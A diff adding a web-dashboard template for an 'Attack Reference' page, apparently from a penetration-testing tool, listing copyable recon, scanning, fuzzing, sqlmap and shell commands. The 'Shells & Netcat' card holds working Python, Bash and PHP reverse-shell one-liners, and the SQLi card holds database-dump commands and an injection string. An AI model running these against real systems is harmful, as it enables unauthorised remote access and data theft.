@@ -1,0 +1,282 @@
+{% extends "base.html" %}
+
+{% block title %}Attack Reference{% endblock %}
+
+{% block content %}
+<div class="container-fluid animate__animated animate__fadeIn">
+    <div class="row mb-4">
+        <div class="col-12">
+            <div class="card bg-dark border-secondary border-opacity-25 shadow-sm">
+                <div class="card-body p-4">
+                    <div class="d-flex align-items-center justify-content-between mb-4 border-bottom border-secondary border-opacity-10 pb-3">
+                        <div>
+                            <h3 class="fw-bold text-light mb-1">
+                                <i class="fas fa-book-dead me-2 text-danger"></i>Attack Reference
+                            </h3>
+                            <p class="text-muted small mb-0">High-fidelity offensive command reference for operators.</p>
+                        </div>
+                        <div class="search-box">
+                            <div class="input-group input-group-sm" style="width: 350px;">
+                                <span class="input-group-text bg-black border-secondary border-opacity-50 text-muted">
+                                    <i class="fas fa-filter"></i>
+                                </span>
+                                <input type="text" id="commandSearch" class="form-control bg-black border-secondary border-opacity-50 text-light" placeholder="Search (nmap, dns, shell, sqlmap, ffuf)...">
+                            </div>
+                        </div>
+                    </div>
+
+                    <div class="row g-4" id="referenceContainer">
+                        <!-- Category: Kali Linux & System -->
+                        <div class="col-md-6 col-lg-4 category-section" data-category="system">
+                            <div class="card h-100 bg-black bg-opacity-25 border-secondary border-opacity-10 shadow-sm">
+                                <div class="card-header bg-transparent border-bottom border-secondary border-opacity-10 py-3">
+                                    <div class="d-flex align-items-center">
+                                        <div class="bg-primary bg-opacity-10 p-2 rounded me-3">
+                                            <i class="fas fa-linux text-primary"></i>
+                                        </div>
+                                        <h6 class="mb-0 text-light small fw-bold text-uppercase tracking-wider">System & Env</h6>
+                                    </div>
+                                </div>
+                                <div class="card-body p-0 max-vh-50 overflow-auto">
+                                    <div class="list-group list-group-flush">
+                                        {{ render_command("Set IP Variable", "export ip=192.168.1.100") }}
+                                        {{ render_command("Find File Location", "locate sbd.exe") }}
+                                        {{ render_command("Identify Binary Path", "which sbd") }}
+                                        {{ render_command("Search for Filename Pattern", "find / -name sbd*") }}
+                                        {{ render_command("Active internet connections", "netstat -lntp") }}
+                                        {{ render_command("Service Check (Apache)", "netstat -antp | grep apache") }}
+                                        {{ render_command("Change Password", "passwd") }}
+                                        {{ render_command("Start/Enable/Stop SSH", "systemctl start ssh\nsystemctl enable ssh\nsystemctl stop ssh") }}
+                                        {{ render_command("Unzip GZ", "gunzip access.log.gz") }}
+                                        {{ render_command("Extract TAR.GZ", "tar -xzvf file.tar.gz") }}
+                                    </div>
+                                </div>
+                            </div>
+                        </div>
+
+                        <!-- Category: Recon & DNS -->
+                        <div class="col-md-6 col-lg-4 category-section" data-category="recon">
+                            <div class="card h-100 bg-black bg-opacity-25 border-secondary border-opacity-10 shadow-sm">
+                                <div class="card-header bg-transparent border-bottom border-secondary border-opacity-10 py-3">
+                                    <div class="d-flex align-items-center">
+                                        <div class="bg-info bg-opacity-10 p-2 rounded me-3">
+                                            <i class="fas fa-radar text-info"></i>
+                                        </div>
+                                        <h6 class="mb-0 text-light small fw-bold text-uppercase tracking-wider">Recon & DNS</h6>
+                                    </div>
+                                </div>
+                                <div class="card-body p-0 max-vh-50 overflow-auto">
+                                    <div class="list-group list-group-flush">
+                                        {{ render_command("Whois IP Lookup", "whois $ip") }}
+                                        {{ render_command("DNS Standard Enum", "dnsrecon -d domain.com -t std") }}
+                                        {{ render_command("DNS Zone Transfer (AXFR)", "dnsrecon -d domain.com -t axfr") }}
+                                        {{ render_command("Dig AXFR Check", "dig axfr domain.com @$ip") }}
+                                        {{ render_command("Dig ANY Records", "dig any domain.com @$ip") }}
+                                        {{ render_command("Passive Subdomain Discovery", "subfinder -d domain.com") }}
+                                        {{ render_command("WAF Identification", "wafw00f domain.com") }}
+                                        {{ render_command("Historical URLs (Wayback)", "curl -s \"http://web.archive.org/cdx/search/cdx?url=*.domain.com/*&output=text&fl=original&collapse=urlkey\"") }}
+                                    </div>
+                                </div>
+                            </div>
+                        </div>
+
+                        <!-- Category: Scanning & Enumeration -->
+                        <div class="col-md-6 col-lg-4 category-section" data-category="scanning">
+                            <div class="card h-100 bg-black bg-opacity-25 border-secondary border-opacity-10 shadow-sm">
+                                <div class="card-header bg-transparent border-bottom border-secondary border-opacity-10 py-3">
+                                    <div class="d-flex align-items-center">
+                                        <div class="bg-warning bg-opacity-10 p-2 rounded me-3">
+                                            <i class="fas fa-network-wired text-warning"></i>
+                                        </div>
+                                        <h6 class="mb-0 text-light small fw-bold text-uppercase tracking-wider">Scanning & Enum</h6>
+                                    </div>
+                                </div>
+                                <div class="card-body p-0 max-vh-50 overflow-auto">
+                                    <div class="list-group list-group-flush">
+                                        {{ render_command("Nmap OS & Service Version", "nmap -sS -sV -O $ip") }}
+                                        {{ render_command("Nmap Quick Top Ports", "nmap -Pn -T4 --top-ports 100 $ip") }}
+                                        {{ render_command("Nmap Comprehensive Scan", "nmap -Pn -p- -T4 -A $ip") }}
+                                        {{ render_command("Nmap UDP Scan", "nmap -sU $ip") }}
+                                        {{ render_command("Nmap Scripting Engine (NSE)", "nmap --script=default $ip") }}
+                                        {{ render_command("Nikto Web Vulnerability", "nikto -h $url") }}
+                                        {{ render_command("Web Technologies (WhatWeb)", "whatweb $url") }}
+                                    </div>
+                                </div>
+                            </div>
+                        </div>
+
+                        <!-- Category: Web Directory Fuzzing -->
+                        <div class="col-md-6 col-lg-4 category-section" data-category="fuzzing">
+                            <div class="card h-100 bg-black bg-opacity-25 border-secondary border-opacity-10 shadow-sm">
+                                <div class="card-header bg-transparent border-bottom border-secondary border-opacity-10 py-3">
+                                    <div class="d-flex align-items-center">
+                                        <div class="bg-danger bg-opacity-10 p-2 rounded me-3">
+                                            <i class="fas fa-folder-open text-danger"></i>
+                                        </div>
+                                        <h6 class="mb-0 text-light small fw-bold text-uppercase tracking-wider">Web Fuzzing</h6>
+                                    </div>
+                                </div>
+                                <div class="card-body p-0 max-vh-50 overflow-auto">
+                                    <div class="list-group list-group-flush">
+                                        {{ render_command("GoBuster Directory Bruteforce", "gobuster dir -u $url -w /usr/share/wordlists/dirb/common.txt -x php,txt,html") }}
+                                        {{ render_command("Dirsearch Recursive", "dirsearch -u $url -e php,txt,html -r") }}
+                                        {{ render_command("FFuF Path Fuzzing", "ffuf -u $url/FUZZ -w wordlist.txt -mc 200,301") }}
+                                        {{ render_command("FFuF Parameter Mining", "ffuf -u $url?FUZZ=1 -w params.txt -mc 200") }}
+                                        {{ render_command("WFuzz Hide 404s", "wfuzz -c -z file,wordlist.txt --hc 404 $url/FUZZ") }}
+                                        {{ render_command("FFuF Subdomain Fuzzing", "ffuf -u http://FUZZ.domain.com -w subdomains.txt") }}
+                                    </div>
+                                </div>
+                            </div>
+                        </div>
+
+                        <!-- Category: SQL Injection & Params -->
+                        <div class="col-md-6 col-lg-4 category-section" data-category="sqli">
+                            <div class="card h-100 bg-black bg-opacity-25 border-secondary border-opacity-10 shadow-sm">
+                                <div class="card-header bg-transparent border-bottom border-secondary border-opacity-10 py-3">
+                                    <div class="d-flex align-items-center">
+                                        <div class="bg-secondary bg-opacity-10 p-2 rounded me-3">
+                                            <i class="fas fa-database text-secondary"></i>
+                                        </div>
+                                        <h6 class="mb-0 text-light small fw-bold text-uppercase tracking-wider">SQLi & Params</h6>
+                                    </div>
+                                </div>
+                                <div class="card-body p-0 max-vh-50 overflow-auto">
+                                    <div class="list-group list-group-flush">
+                                        {{ render_command("Sqlmap List Databases", "sqlmap -u $url --batch --dbs") }}
+                                        {{ render_command("Sqlmap List Tables", "sqlmap -u $url -D db_name --tables") }}
+                                        {{ render_command("Sqlmap List Columns", "sqlmap -u $url -D db_name -T tbl_name --columns") }}
+                                        {{ render_command("Sqlmap Data Dump", "sqlmap -u $url -D db_name -T tbl_name -C col1,col2 --dump") }}
+                                        {{ render_command("Manual SQLi Polyglot", "' OR 1=1 -- -") }}
+                                        {{ render_command("Curl Inspection (Verbose)", "curl -v $url") }}
+                                        {{ render_command("Curl Manual POST", "curl -X POST -d \"user=admin&pass=123\" $url") }}
+                                    </div>
+                                </div>
+                            </div>
+                        </div>
+
+                        <!-- Category: Shells & Netcat -->
+                        <div class="col-md-6 col-lg-4 category-section" data-category="shells">
+                            <div class="card h-100 bg-black bg-opacity-25 border-secondary border-opacity-10 shadow-sm">
+                                <div class="card-header bg-transparent border-bottom border-secondary border-opacity-10 py-3">
+                                    <div class="d-flex align-items-center">
+                                        <div class="bg-success bg-opacity-10 p-2 rounded me-3">
+                                            <i class="fas fa-terminal text-success"></i>
+                                        </div>
+                                        <h6 class="mb-0 text-light small fw-bold text-uppercase tracking-wider">Shells & Netcat</h6>
+                                    </div>
+                                </div>
+                                <div class="card-body p-0 max-vh-50 overflow-auto">
+                                    <div class="list-group list-group-flush">
+                                        {{ render_command("Netcat Listen (LVP)", "nc -lvnp 4444") }}
+                                        {{ render_command("Python 3 Reverse Shell", "python3 -c 'import socket,os,pty;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect((\"$ip\",4444));os.dup2(s.fileno(),0);os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);pty.spawn(\"/bin/bash\")'") }}
+                                        {{ render_command("Bash One-Liner", "bash -i >& /dev/tcp/$ip/4444 0>&1") }}
+                                        {{ render_command("PHP Execute Shell", "php -r '$sock=fsockopen(\"$ip\",4444);exec(\"/bin/sh -i <&3 >&3 2>&3\");'") }}
+                                        {{ render_command("Stable TTY (Python)", "python3 -c 'import pty; pty.spawn(\"/bin/bash\")'") }}
+                                    </div>
+                                </div>
+                            </div>
+                        </div>
+
+                    </div>
+                </div>
+            </div>
+        </div>
+    </div>
+</div>
+
+{% macro render_command(title, cmd) %}
+<div class="list-group-item bg-transparent border-secondary border-opacity-10 px-3 py-3 command-item transition-all" style="cursor: pointer;" onclick="copyToClipboard('{{ cmd|replace('\n', ' && ')|e }}', this)">
+    <div class="d-flex justify-content-between align-items-center mb-2">
+        <span class="extra-small text-muted fw-bold text-uppercase" style="letter-spacing: 0.05em;">{{ title }}</span>
+        <button class="btn btn-link btn-sm text-secondary p-0 copy-btn">
+            <i class="fas fa-copy" style="font-size: 0.7rem;"></i>
+        </button>
+    </div>
+    <div class="bg-black bg-opacity-50 p-2 rounded-1 border border-secondary border-opacity-10">
+        <code class="text-info extra-small d-block text-break font-monospace">{{ cmd }}</code>
+    </div>
+</div>
+{% endmacro %}
+
+<style>
+    .command-item {
+        transition: all 0.2s ease;
+    }
+    .command-item:hover {
+        background-color: rgba(255, 255, 255, 0.03) !important;
+        border-left: 2px solid var(--bs-danger) !important;
+    }
+    .tracking-wider {
+        letter-spacing: 0.15em;
+    }
+    .transition-all {
+        transition: all 0.3s ease;
+    }
+    .max-vh-50 {
+        max-height: 50vh;
+    }
+    .search-box input:focus {
+        box-shadow: 0 0 0 0.25rem rgba(220, 53, 69, 0.1);
+        border-color: rgba(220, 53, 69, 0.5) !important;
+    }
+    ::-webkit-scrollbar {
+        width: 4px;
+    }
+    ::-webkit-scrollbar-thumb {
+        background: rgba(255,255,255,0.1);
+        border-radius: 2px;
+    }
+</style>
+{% endblock %}
+
+{% block scripts %}
+<script>
+    document.addEventListener('DOMContentLoaded', function() {
+        const searchInput = document.getElementById('commandSearch');
+        const sections = document.querySelectorAll('.category-section');
+
+        searchInput.addEventListener('input', function(e) {
+            const term = e.target.value.toLowerCase();
+            
+            sections.forEach(section => {
+                const items = section.querySelectorAll('.command-item');
+                let foundInSection = false;
+
+                items.forEach(item => {
+                    const text = item.innerText.toLowerCase();
+                    if (text.includes(term)) {
+                        item.style.display = 'block';
+                        foundInSection = true;
+                    } else {
+                        item.style.display = 'none';
+                    }
+                });
+
+                if (foundInSection || term === "") {
+                    section.classList.remove('d-none');
+                } else {
+                    section.classList.add('d-none');
+                }
+            });
+        });
+    });
+
+    function copyToClipboard(text, element) {
+        navigator.clipboard.writeText(text).then(() => {
+            const originalIcon = element.querySelector('.copy-btn i');
+            originalIcon.className = 'fas fa-check text-success';
+            
+            const badge = document.createElement('span');
+            badge.className = 'badge bg-success position-absolute top-0 end-0 m-1 extra-small animate__animated animate__fadeIn';
+            badge.innerText = 'Copied!';
+            element.classList.add('position-relative');
+            element.appendChild(badge);
+
+            setTimeout(() => {
+                originalIcon.className = 'fas fa-copy';
+                badge.remove();
+            }, 1500);
+        });
+    }
+</script>
+{% endblock %}
